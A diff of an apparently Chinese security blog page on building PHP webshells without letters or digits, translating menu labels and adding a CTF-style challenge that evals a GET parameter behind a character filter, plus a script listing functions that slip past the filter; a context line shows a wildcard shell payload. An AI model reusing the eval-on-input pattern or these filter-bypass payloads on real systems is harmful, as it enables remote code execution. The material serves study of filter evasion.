@@ -56,25 +56,25 @@
             <li >
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
-                    <span>主页</span>
+                    <span>HOME</span>
                 </a>
             </li>
             <li >
                 <a href="/tags">
                     <i class="iconfont icon-biaoqian1"></i>
-                    <span>标签</span>
+                    <span>TAGS</span>
                 </a>
             </li>
             <li >
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
-                    <span>存档</span>
+                    <span>ARCHIVES</span>
                 </a>
             </li>
             <li >
                 <a href="/about/">
                     <i class="iconfont icon-guanyu2"></i>
-                    <span>关于</span>
+                    <span>ABOUT</span>
                 </a>
             </li>
             
@@ -82,7 +82,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#特殊的webshell"><span class="toc-text">特殊的webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#不包含数字字母"><span class="toc-text">不包含数字字母</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#异或"><span class="toc-text">异或</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#取反"><span class="toc-text">取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符递增"><span class="toc-text">字符递增</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#限制长度"><span class="toc-text">限制长度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展"><span class="toc-text">扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不用数字字母和下划线"><span class="toc-text">不用数字字母和下划线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不用数字、字母、-、"><span class="toc-text">不用数字、字母、_、$</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#特殊的webshell"><span class="toc-text">特殊的webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#不包含数字字母"><span class="toc-text">不包含数字字母</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#异或"><span class="toc-text">异或</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#取反"><span class="toc-text">取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符递增"><span class="toc-text">字符递增</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#限制长度"><span class="toc-text">限制长度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展"><span class="toc-text">扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不用数字字母和下划线"><span class="toc-text">不用数字字母和下划线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不用数字、字母、-、"><span class="toc-text">不用数字、字母、_、$</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#another-test"><span class="toc-text">another test</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol></li></ol>
 </div>
     
 </div>
@@ -93,7 +93,7 @@
         <div class="search-input">
             <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
             <input id="search-input"/>
-            <span id="begin-search">搜索</span>
+            <span id="begin-search">search</span>
         </div>
         <div class="search-result-container" id="search-result-container">
 
@@ -117,16 +117,16 @@
     </div>
 
     <div class="post-meta">
-        <span class="attr">发布于：<span>2019-09-27 11:26:55</span></span>
+        <span class="attr">Post：<span>2019-09-27 11:26:55</span></span>
         
-        <span class="attr">标签：/
+        <span class="attr">Tags：/
         
         <a class="tag" href="/tags/#php" title="php">php</a>
         <span>/</span>
         
         
         </span>
-        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
 </span>
 </span>
     </div>
@@ -300,10 +300,39 @@ else
 ?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>
 <p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p>
 <p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<h2 id="another-test"><a href="#another-test" class="headerlink" title="another test"></a>another test</h2><pre><code>&lt;?php
+highlight_file(__FILE__);
+
+$_ = @$_GET[&apos;_&apos;];
+if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $_) )
+    die(&apos;rosé will not do it&apos;);
+
+if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )
+    die(&apos;you are so close, omg&apos;);
+
+eval($_);
+?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p>
+<pre><code>&lt;?php 
+$arr = get_defined_functions()[&apos;internal&apos;];
+
+foreach ($arr as $key =&gt; $value) {
+    if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $value) ){
+        unset($arr[$key]);
+        continue;
+    }
+
+    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){
+        unset($arr[$key]);
+        continue;
+    }
+}
+
+var_dump($arr);
+?&gt;</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
 <p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>
 <p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
 <p><a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>
+<p><a href="https://xz.aliyun.com/t/5677#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-3</a></p>
 </blockquote>
 
         
